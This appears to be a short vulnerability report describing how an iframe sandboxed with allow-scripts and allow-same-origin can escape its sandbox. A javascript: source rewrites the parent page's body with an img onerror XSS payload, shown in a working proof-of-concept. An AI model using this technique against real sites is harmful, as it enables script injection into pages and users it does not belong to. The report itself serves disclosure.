# Problem Description

The sandboxed iframe with allow-script and allow-same-origin attributes can be escaped via javascript protocol .
It can access parent frame and also make popup and model box.
Let assume the iframe with the following attributes 

```
<iframe sandbox=“allow-scripts allow-same-origin”   src=“UNTRUSTED_DATA”>
```
When we put javascript payloads in UNTRUSTED_DATA , it will not able to make popup and alert/prompt/confirm because 
there is no allow-model and allow-popup.But this can be bypassed by adding our html code to parent.body.innerHTML.

#poc
```
<html>
    <head></head>
    <body>
        <iframe src="javascript:parent.document.body.innerHTML='<img/src=x onerror=alert(document.domain)//>'" sandbox="allow-scripts allow-same-origin"></iframe>
    </body>
</html>
```

# Summary
Iframe sandbox escape ( bypass allow-model , allow-popup)
